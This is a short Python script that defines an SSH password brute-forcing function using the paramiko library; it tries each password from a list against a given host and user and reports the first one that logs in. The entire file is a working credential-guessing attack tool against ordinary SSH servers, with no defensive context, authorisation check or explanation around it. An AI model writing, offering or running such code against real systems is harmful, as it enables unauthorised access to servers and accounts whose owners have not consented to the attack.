import paramiko

def ssh_brute_force(host, username, password_list):
    for password in password_list:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, username=username, password=password)
            print(f"Password found: {password}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            continue
    print("No valid password found.")
    return None
